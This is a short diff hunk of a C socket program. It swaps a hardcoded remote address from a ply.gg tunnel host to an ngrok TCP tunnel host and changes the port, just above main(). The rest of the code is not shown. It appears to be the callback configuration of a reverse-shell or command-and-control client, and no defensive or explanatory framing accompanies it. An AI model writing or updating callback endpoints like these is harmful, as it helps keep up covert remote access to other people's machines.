@@ -5,8 +5,8 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
-#define REMOTE_ADDR "java-atomic.gl.at.ply.gg"
-#define REMOTE_PORT 16652
+#define REMOTE_ADDR "5.tcp.eu.ngrok.io"
+#define REMOTE_PORT 18968
 
 int main(int argc, char *argv[])
 {
